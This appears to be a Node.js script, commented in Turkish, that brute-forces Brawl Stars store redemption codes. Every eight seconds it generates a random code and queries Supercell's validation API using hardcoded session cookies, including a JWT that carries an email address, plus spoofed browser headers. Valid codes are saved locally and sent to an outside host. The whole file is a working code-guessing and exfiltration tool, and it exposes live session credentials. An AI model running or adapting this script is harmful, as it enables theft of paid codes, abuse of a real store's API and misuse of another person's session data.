const axios = require("axios");
const fs = require("fs");
const express = require("express");
const path = require("path");

const app = express();
let port = 8080;

// Rastgele 12 Haneli Kod Üretici
function generateCode() {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let code = "";
    for (let i = 0; i < 12; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return code;
}

// Cookie JSON
const cookies = [
    {
        "name": "OptanonConsent",
        "value": "isGpcEnabled=0&datestamp=Thu+Nov+21+2024+20%3A28%3A22+GMT%2B0300+(GMT%2B03%3A00)&version=202401.2.0&browserGpcFlag=0&isIABGlobal=false&hosts=&genVendors=V4%3A0%2CV1%3A0%2CV2%3A0%2CV3%3A0%2C&consentId=719e1dec-95c9-4c05-8714-7e5eee148444&interactionCount=2&landingPath=NotLandingPage&AwaitingReconsent=false&groups=C0004%3A1%2CC0002%3A1%2CC0001%3A1&geolocation=TR%3B07",
        "domain": ".supercell.com",
        "path": "/"
    },
    {
        "name": "OptanonAlertBoxClosed",
        "value": "2024-11-21T17:27:39.541Z",
        "domain": ".supercell.com",
        "path": "/"
    },
    {
        "name": "sp",
        "value": "cc6d552f-e88d-4276-b9d7-f2f5bdc5268b",
        "domain": ".supercell.com",
        "path": "/"
    },
    {
        "name": "NEXT_LOCALE",
        "value": "tr",
        "domain": "store.supercell.com",
        "path": "/"
    },
    {
        "name": "SESSION_COOKIE",
        "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Ijc4LTZjNmE2ZWFkLTkzMDQtNDJlNi1hZWRkLTFlZjkxYTA4YzMwMyIsImVtYWlsIjoiZWZldDc0NjRAZ21haWwuY29tIiwiaWF0IjoxNzMyMjEwMTAxLCJleHAiOjE3MzIyMTM3MDF9.1Q6WyQ9AXKrWqRgdeHVkB34SHkjMXzfb3-xF2RzWih8",
        "domain": ".store.supercell.com",
        "path": "/"
    },
    {
        "name": "scsso_scid",
        "value": "78-6c6a6ead-9304-42e6-aedd-1ef91a08c303",
        "domain": ".supercell.com",
        "path": "/"
    },
    {
        "name": "_sp_id.031f",
        "value": "3e66c4c3-f190-4685-be6e-41c595d3a05e.1732210102.1.1732210102..37c917fc-14b5-4d87-abec-c23761e5c32d....0",
        "domain": "store.supercell.com",
        "path": "/"
    },
    {
        "name": "_sp_ses.031f",
        "value": "*",
        "domain": "store.supercell.com",
        "path": "/"
    },
    {
        "name": "OAUTH_LOGIN_STATE",
        "value": "eyJ1dWlkIjoiYWI0OTY5YmEtNTUwOS00YTA4LTg1ZjYtNTgwYzkzNTgyMzNjIiwicmVkaXJlY3RVcmkiOiIvYnJhd2xzdGFycyJ9",
        "domain": ".store.supercell.com",
        "path": "/"
    },
    {
        "name": "VIEWER_COUNTRY",
        "value": "TR",
        "domain": "store.supercell.com",
        "path": "/"
    }
    // Daha önce verdiğiniz tüm cookie'ler buraya eklendi.
];

// Cookie string oluştur
const cookieString = cookies
    .map(cookie => `${cookie.name}=${cookie.value}`)
    .join("; ");

// Kod Üret ve Kontrol Et
async function validateAndNotifyCode() {
    let code;

    do {
        code = generateCode();
    } while (fs.existsSync("bot.txt") && fs.readFileSync("bot.txt", "utf8").includes(code));

    const url = `https://store.supercell.com/api/v3/brawlstars/store-codes/${code}/validate`;

    try {
        const response = await axios.get(url, {
            headers: {
                "Referer": "https://store.supercell.com/tr/brawlstars",
                "Sec-Ch-Ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
                "Sec-Ch-Ua-Mobile": "?1",
                "Sec-Ch-Ua-Platform": "\"Android\"",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10;K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "Sentry-Trace": "7e473b25e3004fa9a86c29ae11deba098b8e5c61ee85-0",
                "Cookie": cookieString,
                "Baggage": "sentry-environment=production,sentry-release=11912188237,sentry-public_key=ea3492c3b6144fcb83fe9bd3194bfc5,sentry-trace_id=7e473b25e3004fa986cd47429ae11de,sentry-sample_rate=0.005,sentry-transaction=%2F%5BgameSlug%5D,sentry-sampled=false",
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"
            }
        });

        const responseString = JSON.stringify(response.data);
        const { valid } = response.data;

        console.log(`Kod: ${code}, Yanıt: ${responseString}`);

        if (valid && valid !== false) {
            // Eğer valid başka bir şey ise (örneğin true) win.txt'ye yaz
            fs.appendFileSync("win.txt", `${code} - ${responseString}\n`, "utf8");

            const notifyUrl = `http://bsaxery.rf.gd/code.php?code=${code}&valid=${valid}&print=${encodeURIComponent(responseString)}`;
            try {
                const notifyResponse = await axios.get(notifyUrl);
                console.log("Bildirim gönderildi:", notifyResponse.data);
            } catch (notifyError) {
                console.error("Bildirim gönderim hatası:", notifyError.message);
            }
        } else if (valid === false) {
            // Eğer valid false ise bot.txt'ye yaz
            fs.appendFileSync("bot.txt", `${code}\n\n`, "utf8");
        }
    } catch (error) {
        console.error("İstek hatası:", error.message);
    }
}

// Her 8 saniyede bir yeni kod dene
setInterval(validateAndNotifyCode, 8000);

// Ana dizindeki index.html dosyasını sun
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

// Uygulama başlat
app.listen(port, () => {
    console.log(`Sunucu ${port} portunda başlatıldı. http://localhost:${port}`);
});
